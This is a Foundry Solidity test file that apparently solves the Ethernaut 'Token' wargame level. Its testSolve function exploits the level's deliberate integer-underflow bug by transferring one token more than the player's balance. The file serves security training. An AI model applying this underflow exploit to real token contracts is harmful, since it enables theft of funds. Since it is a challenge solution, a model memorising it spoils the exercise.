// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DummyFactory} from "src/levels/DummyFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

interface Token {
    function transfer(address, uint256) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TestToken is Test, Utils {
    Ethernaut ethernaut;
    Token instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DummyFactory factory = DummyFactory(getOldFactory("TokenFactory"));
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Token(
            payable(createLevelInstance(ethernaut, Level(address(factory)), 0))
        );
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);

        uint256 balance = instance.balanceOf(address(player));
        console2.log("player balance", balance);
        // Transfer a greater amount than the player's balance, the contract didn't check underflow.
        instance.transfer(address(this), balance + 1);
        balance = instance.balanceOf(address(player));
        console2.log("player balance", balance);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
